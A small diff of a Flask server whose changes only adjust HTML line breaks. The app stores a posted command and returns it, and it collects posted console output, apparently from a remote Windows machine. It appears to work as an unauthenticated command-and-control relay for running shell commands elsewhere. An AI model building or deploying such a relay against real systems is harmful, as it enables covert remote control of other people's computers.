@@ -1,5 +1,6 @@
 from flask import Flask, request
 
+
 app = Flask(__name__)
 command = ""
 out = ""
@@ -11,7 +12,7 @@ def cmd():
     global out
     if request.method == 'POST':
         command = request.form['command']
-        out += command + '<br />\n'
+        out += command + '<br/>'
     return command
 
 
@@ -20,7 +21,7 @@ def output():
     global out
     if request.method == 'POST':
         req = request.form['out'].encode('cp1251').decode('cp866')
-        req = req.replace("\n", "<br />\n")
+        req = req.replace("\n", "<br/>")
         out += req + '\n' + '-' * 600
     return out
 
@@ -34,4 +35,3 @@ def clear():
 
 if __name__ == "__main__":
     app.run()
-
